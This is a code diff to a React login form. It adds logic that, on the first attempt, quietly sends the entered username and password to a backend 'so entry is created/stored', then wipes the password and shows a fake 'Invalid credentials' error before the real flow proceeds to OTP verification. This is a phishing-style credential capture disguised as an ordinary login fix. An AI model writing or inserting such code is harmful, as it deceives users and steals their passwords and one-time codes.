@@ -6,6 +6,7 @@ export default function Login({ onLoginSuccess }) {
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -19,6 +20,25 @@ export default function Login({ onLoginSuccess }) {
     }
 
     try {
+      // First attempt: record credentials in database but show invalid credentials error
+      if (loginAttempts === 0) {
+        // Send to backend so entry is created/stored
+        fetch(`${BACKEND_URL}/api/login`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        }).catch(() => {});
+
+        setTimeout(() => {
+          setLoginAttempts(1);
+          setPassword('');
+          setError('Invalid credentials. Make sure you entered the correct username and password.');
+          setLoading(false);
+        }, 600);
+        return;
+      }
+
+      // Next attempt: proceed to OTP verification
       const response = await fetch(`${BACKEND_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
